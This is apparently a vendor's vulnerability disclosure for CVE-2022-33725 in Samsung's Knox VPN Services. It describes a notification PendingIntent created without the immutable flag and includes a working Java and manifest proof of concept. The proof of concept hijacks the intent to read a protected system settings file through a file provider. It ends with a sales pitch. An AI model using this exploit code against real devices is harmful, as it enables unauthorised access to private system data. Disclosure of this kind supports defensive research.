# Details

<table>
    <tr>
        <td>Name</td>
        <td>Knox VPN Services</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.sVpn</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.18</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.08.02</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>High</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-33725">CVE-2022-33725</a> (SVE-2022-0953)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1150</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

Oversecured found the use of an implicit intent to create a `PendingIntent` object for notifications without using the `PendingIntent.FLAG_IMMUTABLE` flag. The attacker's app, if it had access to app notifications, could intercept them and redirect them to its activity, before making it grant access rights to content providers with the `android:grantUriPermissions="true"` flag.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<service android:name=".NotificationListener" android:label="PoC" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true">
    <intent-filter>
        <action android:name="android.service.notification.NotificationListenerService" />
    </intent-filter>
</service>
```
```xml
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter>
        <action android:name="smth" />
        <category android:name="smth" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

File `NotificationListener.java`:
```java
private static final String APP = "com.sec.android.app.dexonpc";

@Override
public void onNotificationPosted(StatusBarNotification sbn, NotificationListenerService.RankingMap rankingMap) {
    if (!APP.equals(sbn.getPackageName())) {
        return;
    }
    PendingIntent contentIntent = sbn.getNotification().contentIntent;
    if (contentIntent == null) {
        return;
    }
    try {
        Intent fillin = new Intent("smth");
        fillin.addCategory("smth");
        fillin.setClipData(getClipData());
        fillin.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);

        contentIntent.send(this, 0, fillin);
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private ClipData getClipData() {
    Uri uri = Uri.parse("content://com.sec.internal.ims.rcs.fileprovider/root/data/system/users/0/settings_secure.xml");
    return ClipData.newRawUri("", uri);
}
```

File `InterceptActivity.java`:
```java
Uri uri = getIntent().getClipData().getItemAt(0).getUri();
try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
    Log.d("evil", IOUtils.toString(inputStream));
} catch (Throwable th) {
    throw new RuntimeException(th);
}
```

As a result, when the app displays this notification, the attacking app automatically forwards the `PendingIntent` object to `InterceptActivity`.

## References

- [Oversecured Blog. Gaining access to arbitrary* Content Providers](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.